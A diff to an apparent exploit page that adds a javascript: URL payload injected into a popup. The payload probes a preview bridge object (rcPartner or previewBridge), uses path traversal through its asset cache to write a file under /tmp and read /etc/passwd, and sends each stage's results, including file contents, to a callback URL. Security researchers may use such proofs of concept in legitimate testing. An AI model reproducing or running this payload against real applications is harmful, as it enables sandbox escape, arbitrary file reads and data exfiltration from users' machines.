@@ -56,6 +56,41 @@ async function log(data) {
 
       setTimeout(async () => {
         try {
+          const js = `
+            (async function(){
+              const C=${JSON.stringify(CALLBACK)};
+              async function L(d){ await fetch(C+"?"+new URLSearchParams(d), {mode:"no-cors"}); }
+              try {
+                const b = window.rcPartner || window.previewBridge;
+                await L({stage:"jsurl-start", href:location.href, hasBridge:String(!!b)});
+                if (!b) return;
+                await L({stage:"jsurl-caps", caps:JSON.stringify(await b.capabilities())});
+                try {
+                  await b.assetCache.put("../../../../../../tmp/r3chat-jsurl", "jsurl write\\n", "utf8");
+                  await L({stage:"jsurl-write-ok"});
+                } catch(e) {
+                  await L({stage:"jsurl-write-fail", err:String(e)});
+                }
+                try {
+                  const p = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
+                  await L({stage:"jsurl-read", sample:p.slice(0,180)});
+                } catch(e) {
+                  await L({stage:"jsurl-read-fail", err:String(e)});
+                }
+              } catch(e) {
+                await L({stage:"jsurl-error", err:String(e && (e.stack || e))});
+              }
+            })()
+          `;
+          popup.location.href = "javascript:" + js.replace(/\s+/g, " ");
+          await log({ stage: "dbg-jsurl-issued" });
+        } catch (e) {
+          await log({ stage: "dbg-jsurl-fail", err: String(e) });
+        }
+      }, 1500);
+
+      setTimeout(async () => {
+        try {
           popup.location.replace(next + "&method=replace");
           await log({ stage: "dbg-replace" });
         } catch (e) {
@@ -91,5 +126,4 @@ async function log(data) {
   }
 })().catch(e => log({ stage: "error", err: String(e && (e.stack || e)) }));
 </script>
-<!-- rebuild 0205 -->
-<!-- rebuild 0239 -->
+<!-- rebuild 0239 jsurl -->
